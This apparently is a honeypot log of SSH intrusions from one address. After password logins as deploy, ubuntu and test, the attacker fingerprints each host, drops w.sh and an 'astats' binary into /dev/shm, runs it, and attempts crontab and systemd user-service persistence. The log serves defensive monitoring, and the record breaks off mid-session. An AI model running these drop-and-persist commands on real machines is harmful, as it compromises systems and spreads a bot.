+[2026-04-20 16:06:15.000000 UTC] [1776701173_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:06:15.000500 UTC] [1776701173_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:28.421187 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41254 | raw=Connection from 149.210.235.123 port 41254 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:40:28.522825 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41264 | raw=Connection from 149.210.235.123 port 41264 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:40:28.992657 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:41254 | user=deploy | method=password | raw=Accepted password for deploy from 149.210.235.123 port 41254 ssh2
+
+[2026-04-20 18:40:29.000000 UTC] [1776710429_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710429_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:29.000010 UTC] [1776710429_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 18:40:32.000000 UTC] [1776710429_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:32.000000 UTC] [1776710432_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710432_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:32.000010 UTC] [1776710432_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 18:40:32.000500 UTC] [1776710429_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:32.363561 UTC] [1776710429_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=uname -a
+
+[2026-04-20 18:40:32.532804 UTC] [1776710429_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=uname -a | exit_code=0 | stdout_bytes=102 | stderr_bytes=0
+
+[2026-04-20 18:40:32.532904 UTC] [1776710429_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-20 18:40:36.637529 UTC] [1776710432_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 18:40:36.707858 UTC] [1776710432_149.210.235.123_41254_sshshadow] [event]
+suspicious | detail=inline_exec:sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | severity=medium | action=observe
+
+[2026-04-20 18:40:36.832393 UTC] [1776710432_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | exit_code=0 | stdout_bytes=9 | stderr_bytes=0
+
+[2026-04-20 18:40:36.832493 UTC] [1776710432_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-20 18:40:37.000000 UTC] [1776710432_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:37.000000 UTC] [1776710437_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710437_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:37.000010 UTC] [1776710437_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 18:40:37.000500 UTC] [1776710432_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:39.471419 UTC] [1776710437_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 18:40:39.660417 UTC] [1776710437_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=cat /proc/cpuinfo | grep processor | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 18:40:39.660517 UTC] [1776710437_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+2
+
+[2026-04-20 18:40:40.000000 UTC] [1776710437_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:40.000000 UTC] [1776710440_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710440_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:40.000010 UTC] [1776710440_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 18:40:40.000500 UTC] [1776710437_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:42.000000 UTC] [1776710440_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:42.000500 UTC] [1776710440_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:42.397283 UTC] [1776710440_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 18:40:42.467216 UTC] [1776710440_149.210.235.123_41254_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | severity=medium | action=observe
+
+[2026-04-20 18:40:42.585949 UTC] [1776710440_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 18:40:43.000000 UTC] [1776710443_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710443_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:43.000010 UTC] [1776710443_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 18:40:44.000000 UTC] [1776710443_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 18:40:44.000000 UTC] [1776710444_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710444_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:44.000010 UTC] [1776710444_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:40:44.000500 UTC] [1776710443_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:44.237165 UTC] [1776710443_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 18:40:44.451803 UTC] [1776710443_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+ | exit_code=127 | stdout_bytes=0 | stderr_bytes=46
+
+[2026-04-20 18:40:44.452003 UTC] [1776710443_149.210.235.123_41254_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-20 18:40:46.000000 UTC] [1776710444_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 18:40:46.000000 UTC] [1776710446_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710446_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:46.000010 UTC] [1776710446_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:40:46.000500 UTC] [1776710444_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:46.085156 UTC] [1776710444_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:40:46.280077 UTC] [1776710444_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 18:40:46.280277 UTC] [1776710444_149.210.235.123_41254_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 18:40:47.968950 UTC] [1776710446_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:40:48.000000 UTC] [1776710446_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:48.000500 UTC] [1776710446_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:48.295555 UTC] [1776710446_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=186 | stderr_bytes=0
+
+[2026-04-20 18:40:48.295655 UTC] [1776710446_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+    747 16.6 strace
+    752  6.6 ps
+    252  0.1 sshd
+      1  0.0 bash
+    255  0.0 sshd
+    249  0.0 python3
+    248  0.0 sshd
+    699  0.0 bash
+    741  0.0 bash
+
+[2026-04-20 18:40:49.000000 UTC] [1776710449_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710449_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:49.000010 UTC] [1776710449_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:40:50.000000 UTC] [1776710449_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:40:50.000000 UTC] [1776710450_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710450_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:40:50.000010 UTC] [1776710450_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:40:50.000500 UTC] [1776710449_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:40:50.159206 UTC] [1776710449_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:40:50.389551 UTC] [1776710449_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 18:40:50.389651 UTC] [1776710449_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 18:40:52.042166 UTC] [1776710450_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:41:01.245642 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:47410 | raw=Connection from 149.210.235.123 port 47410 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:41:01.332130 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:47426 | raw=Connection from 149.210.235.123 port 47426 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:41:02.000000 UTC] [1776710462_149.210.235.123_47410_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710462_149.210.235.123_47410_sshshadow
+
+[2026-04-20 18:41:02.000010 UTC] [1776710462_149.210.235.123_47410_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 18:41:02.000020 UTC] [1776710462_149.210.235.123_47410_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:41:02.177488 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:47410 | user=ubuntu | method=password | raw=Accepted password for ubuntu from 149.210.235.123 port 47410 ssh2
+
+[2026-04-20 18:41:03.000000 UTC] [1776710450_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:41:03.000000 UTC] [1776710463_149.210.235.123_47410_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710463_149.210.235.123_47410_sshshadow
+
+[2026-04-20 18:41:03.000010 UTC] [1776710463_149.210.235.123_47410_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 18:41:03.000020 UTC] [1776710463_149.210.235.123_47410_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:41:03.000500 UTC] [1776710450_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:41:03.710671 UTC] [1776710450_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 18:41:04.000000 UTC] [1776710464_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710464_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:41:04.000000 UTC] [1776710464_149.210.235.123_47410_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710464_149.210.235.123_47410_sshshadow
+
+[2026-04-20 18:41:04.000010 UTC] [1776710464_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges
+
+[2026-04-20 18:41:04.000010 UTC] [1776710464_149.210.235.123_47410_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:41:04.000020 UTC] [1776710464_149.210.235.123_47410_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:41:04.000200 UTC] [1776710464_149.210.235.123_41254_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: ./astats: Permission denied
+
+[2026-04-20 18:41:05.000000 UTC] [1776710464_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=exit_code_141
+
+[2026-04-20 18:41:05.000000 UTC] [1776710465_149.210.235.123_47410_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710465_149.210.235.123_47410_sshshadow
+
+[2026-04-20 18:41:05.000010 UTC] [1776710465_149.210.235.123_47410_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:41:05.000020 UTC] [1776710465_149.210.235.123_47410_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:41:05.000500 UTC] [1776710464_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:41:05.429073 UTC] [1776710464_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges
+
+[2026-04-20 18:41:05.524154 UTC] [1776710464_149.210.235.123_41254_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && chmod +x astats && ./astats ssh 2 ranges | severity=medium | action=observe
+
+[2026-04-20 18:41:06.000000 UTC] [1776710466_149.210.235.123_41254_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710466_149.210.235.123_41254_sshshadow
+
+[2026-04-20 18:41:06.000010 UTC] [1776710466_149.210.235.123_41254_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:41:07.000000 UTC] [1776710466_149.210.235.123_41254_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:41:07.000500 UTC] [1776710466_149.210.235.123_41254_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:41:07.536423 UTC] [1776710466_149.210.235.123_41254_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:41:07.789125 UTC] [1776710466_149.210.235.123_41254_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 18:41:07.789225 UTC] [1776710466_149.210.235.123_41254_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 18:42:54.332976 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41472 | raw=Connection from 149.210.235.123 port 41472 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:42:54.441984 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41486 | raw=Connection from 149.210.235.123 port 41486 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:42:54.884596 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:41472 | user=test | method=password | raw=Accepted password for test from 149.210.235.123 port 41472 ssh2
+
+[2026-04-20 18:42:55.000000 UTC] [1776710575_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710575_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:42:55.000010 UTC] [1776710575_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 18:42:56.000000 UTC] [1776710575_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:42:56.000500 UTC] [1776710575_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:42:56.392186 UTC] [1776710575_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=uname -a
+
+[2026-04-20 18:42:56.588852 UTC] [1776710575_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=uname -a | exit_code=0 | stdout_bytes=102 | stderr_bytes=0
+
+[2026-04-20 18:42:56.588952 UTC] [1776710575_149.210.235.123_41472_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-20 18:42:57.000000 UTC] [1776710577_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710577_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:42:57.000010 UTC] [1776710577_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 18:42:58.000000 UTC] [1776710577_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:42:58.000500 UTC] [1776710577_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:42:58.236848 UTC] [1776710577_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 18:42:58.299499 UTC] [1776710577_149.210.235.123_41472_sshshadow] [event]
+suspicious | detail=inline_exec:sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | severity=medium | action=observe
+
+[2026-04-20 18:42:58.396770 UTC] [1776710577_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | exit_code=0 | stdout_bytes=9 | stderr_bytes=0
+
+[2026-04-20 18:42:58.396870 UTC] [1776710577_149.210.235.123_41472_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-20 18:42:59.000000 UTC] [1776710579_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710579_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:42:59.000010 UTC] [1776710579_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 18:43:00.000000 UTC] [1776710579_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:43:00.000500 UTC] [1776710579_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:00.351618 UTC] [1776710579_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 18:43:00.539687 UTC] [1776710579_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=cat /proc/cpuinfo | grep processor | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 18:43:00.539787 UTC] [1776710579_149.210.235.123_41472_sshshadow] [exec_stdout]
+exec.stdout
+2
+
+[2026-04-20 18:43:01.000000 UTC] [1776710581_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710581_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:01.000010 UTC] [1776710581_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 18:43:03.686322 UTC] [1776710581_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 18:43:03.766305 UTC] [1776710581_149.210.235.123_41472_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | severity=medium | action=observe
+
+[2026-04-20 18:43:03.844976 UTC] [1776710581_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 18:43:04.000000 UTC] [1776710581_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:43:04.000000 UTC] [1776710584_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710584_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:04.000010 UTC] [1776710584_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 18:43:04.000020 UTC] [1776710584_149.210.235.123_41472_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:43:04.000500 UTC] [1776710581_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:05.000000 UTC] [1776710584_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=exit_code_23
+
+[2026-04-20 18:43:05.000000 UTC] [1776710585_149.210.235.123_41472_sshshadow] [session_start]
